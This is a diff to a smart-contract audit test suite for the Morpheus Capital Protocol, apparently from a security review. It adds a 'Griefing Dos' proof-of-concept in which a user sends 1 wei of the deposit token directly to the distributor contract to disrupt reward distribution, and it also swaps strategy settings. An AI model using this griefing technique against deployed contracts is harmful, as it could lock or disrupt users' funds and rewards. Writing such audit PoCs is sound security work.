@@ -291,7 +291,7 @@ describe('Morpheus Capital Protocol - POC Test Suite', function () {
       await depositPool.getAddress(),
       await depositToken.getAddress(),
       'ETH/USD',
-      Strategy.NONE,
+      Strategy.AAVE,
     );
 
     // Complete migration
@@ -339,10 +339,67 @@ describe('Morpheus Capital Protocol - POC Test Suite', function () {
 
   // Example POC Templates
   describe('POC Templates', function () {
-    it.only('POC-1: DepositPool - Example vulnerability test', async function () {
+    it.only('Griefing Dos', async function () {
+      await distributor.setRewardPoolLastCalculatedTimestamp(publicRewardPoolId, 1);
+      await distributor.setMinRewardsDistributePeriod(0);
+
+      await setNextTime(oneDay * 11);
+      console.log(
+        '>>>>>>> distributer balance(initial):',
+        ethers.formatEther(await depositToken.balanceOf(await distributor.getAddress())),
+      );
+      console.log(
+        '>>>>>>> l1senderV2 balance(initial):',
+        ethers.formatEther(await depositToken.balanceOf(await l1Sender.getAddress())),
+      );
+      await depositToken.connect(charlie).transfer(await distributor.getAddress(), 1);
+
+      console.log(
+        '>>>>>>> distributer balance(after charlie transfered):',
+        ethers.formatEther(await depositToken.balanceOf(await distributor.getAddress())),
+      );
+
+      await depositPool.connect(alice).stake(publicRewardPoolId, wei(100), 0, ZERO_ADDR);
+      console.log(
+        '>>>>>>> distributer balance(after alice stake 100):',
+        ethers.formatEther(await depositToken.balanceOf(await distributor.getAddress())),
+      );
+      await depositPool.connect(bob).stake(publicRewardPoolId, wei(50), 0, ZERO_ADDR);
+      console.log(
+        '>>>>>>> distributer balance(after bob stakes 50):',
+        ethers.formatEther(await depositToken.balanceOf(await distributor.getAddress())),
+      );
+
+      await setNextTime(oneDay * 50);
+
+      console.log(
+        '>>>>>>> distributer balance(after 50 days):',
+        ethers.formatEther(await depositToken.balanceOf(await distributor.getAddress())),
+      );
+
+      //await distributor.distributeRewards(publicRewardPoolId);
+      console.log(
+        '>>>>>>> distributer balance(after distribution):',
+        ethers.formatEther(await depositToken.balanceOf(await distributor.getAddress())),
+      );
+
+      const undistributed = await distributor.undistributedRewards();
+      console.log('>> Undistributed rewards:', ethers.formatEther(undistributed), 'tokens');
+      console.log(
+        '>>>>>>> l1senderV2 balance(after):',
+        ethers.formatEther(await depositToken.balanceOf(await l1Sender.getAddress())),
+      );
+      const aliceRewards = await depositPool.getLatestUserReward(publicRewardPoolId, alice.address);
+      const bobRewards = await depositPool.getLatestUserReward(publicRewardPoolId, bob.address);
+      console.log('>> Alice pendingRewards:', ethers.formatEther(aliceRewards));
+      console.log('>> Bob pendingRewards  :', ethers.formatEther(bobRewards));
+    });
+
+    it('POC-1: DepositPool - Example vulnerability test', async function () {
       // Setup reward pool timestamp (required before any staking)
       await distributor.setRewardPoolLastCalculatedTimestamp(publicRewardPoolId, 1);
       await distributor.setMinRewardsDistributePeriod(0);
+
       console.log(
         '>>>>>>> distributer balance:',
         ethers.formatEther(await depositToken.balanceOf(await distributor.getAddress())),
@@ -471,7 +528,7 @@ describe('Morpheus Capital Protocol - POC Test Suite', function () {
       await depositPool2.getAddress(),
       await pool2.getAddress(),
       'ETH/USD',
-      Strategy.AAVE,
+      Strategy.NONE,
     );
 
     return { pool2, depositPool2, aToken };
